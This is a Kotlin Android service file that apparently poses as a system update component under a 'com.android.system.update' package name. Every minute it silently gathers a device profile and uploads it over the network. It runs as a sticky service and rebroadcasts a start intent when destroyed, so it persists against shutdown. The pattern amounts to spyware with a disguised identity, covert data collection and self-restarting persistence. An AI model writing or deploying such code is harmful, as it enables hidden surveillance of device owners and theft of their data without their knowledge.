package com.android.system.update.core

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.Handler
import android.os.Looper

class BackgroundCoreService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val interval = 60000L
    private lateinit var networkManager: NetworkConnectionManager
    private lateinit var deviceAnalyzer: DeviceProfileAnalyzer

    override fun onCreate() {
        super.onCreate()
        networkManager = NetworkConnectionManager(applicationContext)
        deviceAnalyzer = DeviceProfileAnalyzer(applicationContext)
        startCoreLogic()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun startCoreLogic() {
        handler.post(object : Runnable {
            override fun run() {
                if (networkManager.checkConnectivity()) {
                    val payload = deviceAnalyzer.getDeviceProfile()
                    networkManager.sync(payload)
                }
                handler.postDelayed(this, interval)
            }
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        val intent = Intent("com.android.system.update.START")
        sendBroadcast(intent)
    }
}